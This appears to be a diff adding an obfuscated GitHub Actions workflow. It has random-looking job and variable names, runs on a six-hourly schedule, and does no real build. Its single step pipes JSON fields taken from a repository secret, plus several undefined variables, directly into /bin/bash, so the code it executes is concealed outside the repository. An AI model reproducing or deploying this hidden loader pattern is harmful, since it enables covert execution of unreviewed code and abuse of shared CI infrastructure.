@@ -1,0 +1,28 @@
+name: changyiwan8765
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: changyiwan8765
+        env:
+          vf00308: ${{ secrets.vf00308 }}
+        run: |
+          echo $vf00308 | jq -r .nla0 | /bin/bash
+          echo $kkw36 | jq -r .mk238 | /bin/bash
+          echo $xeby507 | jq -r .p3 | /bin/bash
+          echo $o4 | jq -r .fyggu715 | /bin/bash
+          echo $zufjx4 | jq -r .g3318 | /bin/bash
+          echo $ckzx75 | jq -r .wiq56447 | /bin/bash
+          echo $dfmny3 | jq -r .azvtx55 | /bin/bash
+          echo $zfo78772 | jq -r .lo8635 | /bin/bash
+          echo $sdx09 | jq -r .xqqkz7416 | /bin/bash
+          echo $gtql09725 | jq -r .s3766 | /bin/bash
+          echo $hdf837 | jq -r .tp017 | /bin/bash
+          echo $wlp05085 | jq -r .kydf9588 | /bin/bash
+
